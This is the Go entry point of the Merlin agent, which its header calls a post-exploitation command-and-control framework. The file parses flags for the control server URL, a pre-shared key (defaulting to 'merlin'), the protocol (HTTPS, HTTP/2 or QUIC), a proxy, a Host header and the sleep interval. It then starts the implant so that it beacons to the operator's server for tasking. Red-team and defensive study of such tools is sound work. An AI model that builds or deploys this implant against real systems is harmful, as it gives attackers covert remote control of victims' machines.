// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	// Standard
	"flag"
	"fmt"
	"os"
	"time"

	// 3rd Party
	"github.com/fatih/color"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg"
	"github.com/Ne0nd0g/merlin/pkg/agent"
)

// GLOBAL VARIABLES
var url = "https://127.0.0.1:443"
var protocol = "h2"
var build = "nonRelease"
var psk = "merlin"
var proxy = ""
var host = ""

func main() {
	verbose := flag.Bool("v", false, "Enable verbose output")
	version := flag.Bool("version", false, "Print the agent version and exit")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
	flag.StringVar(&psk, "psk", psk, "Pre-Shared Key used to encrypt initial communications")
	flag.StringVar(&protocol, "proto", protocol, "Protocol for the agent to connect with [https (HTTP/1.1), h2 (HTTP/2), hq (QUIC or HTTP/3.0)]")
	flag.StringVar(&proxy, "proxy", proxy, "Hardcoded proxy to use for http/1.1 traffic only that will override host configuration")
	flag.StringVar(&host, "host", host, "HTTP Host header")
	sleep := flag.Duration("sleep", 30000*time.Millisecond, "Time for agent to sleep")
	flag.Usage = usage
	flag.Parse()

	if *version {
		color.Blue(fmt.Sprintf("Merlin Agent Version: %s", merlin.Version))
		color.Blue(fmt.Sprintf("Merlin Agent Build: %s", build))
		os.Exit(0)
	}

	// Setup and run agent
	a, err := agent.New(protocol, url, host, psk, proxy, *verbose, *debug)
	if err != nil {
		if *verbose {
			color.Red(err.Error())
		}
		os.Exit(1)
	}
	a.WaitTime = *sleep
	errRun := a.Run()
	if errRun != nil {
		if *verbose {
			color.Red(errRun.Error())
		}
		os.Exit(1)
	}
}

// usage prints command line options
func usage() {
	fmt.Printf("Merlin Agent\r\n")
	flag.PrintDefaults()
	os.Exit(0)
}
